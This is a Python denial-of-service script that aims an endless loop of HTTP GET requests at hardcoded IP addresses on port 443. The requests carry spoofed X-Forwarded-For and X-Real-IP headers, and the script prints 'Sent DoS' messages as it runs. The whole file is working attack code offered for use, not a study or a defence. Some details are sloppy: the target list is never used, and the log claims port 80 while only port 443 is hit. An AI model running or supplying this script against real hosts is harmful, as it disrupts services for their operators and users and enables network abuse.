import threading, socket
from socket import IPPROTO_TCP
from contextlib import suppress
from time import sleep

targets = [
	"185.143.234.120",
	"87.101.236.140",
	"87.101.209.6",
	"87.101.209.5",
 	"178.216.251.242"
]
ip:str = "178.216.251.242"
port = int(443)

## Some fake ass IP
dummy_ip = "255.143.234.120"

## The connection count
already_conn = 0

def attack():
	while True:
		try:
			AVB()
		except Exception as e:
			print(f"Failed to send DoS to {ip} - Error: {e}")


def generate_payload(other: str = None) -> bytes:
    return str.encode((
		("%s %s HTTP/%s\r\n" % ("GET", "/", "1.1"))
		+ 	('Accept-Encoding: gzip, deflate, br\r\n'+
			'Accept-Language: en-US,en;q=0.9\r\n'+
			'Cache-Control: max-age=0\r\n'+
			'Connection: keep-alive\r\n'+
			'Sec-Fetch-Dest: document\r\n'+
			'Sec-Fetch-Mode: navigate\r\n'+
			'Sec-Fetch-Site: none\r\n'+
			'Sec-Fetch-User: ?1\r\n'+
			'Sec-Gpc: 1\r\n'+
			'Pragma: no-cache\r\n'+
			'Upgrade-Insecure-Requests: 1\r\n')
			+ f"Host: {ip}\r\n"
			+ "X-Forwarded-Proto: Http\r\n"
			+ f"X-Forwarded-Host: {ip}, 1.1.1.1\r\n"
			+ f"Via: {dummy_ip}\r\n"
			+f"X-Client-IP: {dummy_ip}\r\n"
			+f'X-Forwarded-For: {dummy_ip}\r\n'
			+f'X-Real-IP: {dummy_ip}\r\n'
			+ randHeaderContent()
			+ (other if other else "")
			+ "\r\n"	
	))
    
def randHeaderContent() -> str:
    return (
        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\r\n"
        f"Referrer: https://{ip}/\r\n"
    )
    
def send(sock: socket, packet: bytes):
	# send the packet payload to the target
	sock.send(packet)
	

def open_connection(host = None):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(IPPROTO_TCP, socket.TCP_NODELAY, 1)
	sock.settimeout(.9)
	sock.connect((host if host else ip, port))
	return sock
 
def AVB():
	payload: bytes = generate_payload()
	s = None
	with suppress(Exception), open_connection() as s:
		for _ in range(1000):
			sleep(max(1000, 1000) / 1000)
			send(s, payload)
			print(f"Sent DoS to {ip} - Ports: 80, 443")
   
        
attack()
